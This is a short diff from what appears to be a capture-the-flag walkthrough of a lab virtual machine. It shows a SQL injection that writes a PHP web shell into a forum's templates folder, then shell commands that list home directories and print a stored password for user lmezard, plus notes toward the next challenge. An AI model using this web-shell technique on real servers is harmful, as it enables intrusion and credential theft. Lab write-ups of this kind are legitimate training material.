@@ -91,3 +91,27 @@ SELECT '<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text
 INTO OUTFILE '/var/www/forum/templates_c/cmd.php'
 
 https://192.168.1.139/forum/templates_c/cmd.php
+
+ls /home
+LOOKATME
+ft_root
+laurie
+laurie@borntosec.net
+lmezard
+thor
+zaz
+
+ls /home/LOOKATME
+password
+
+cat /home/LOOKATME/password
+lmezard:G!@M6f4Eatau{sF"
+
+login with lmezard on the virtual machine
+
+cat README
+Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+
+main function call 12 fucntion which return a char. Then SHA-256 to get the passwd
+
+I..a...wnage
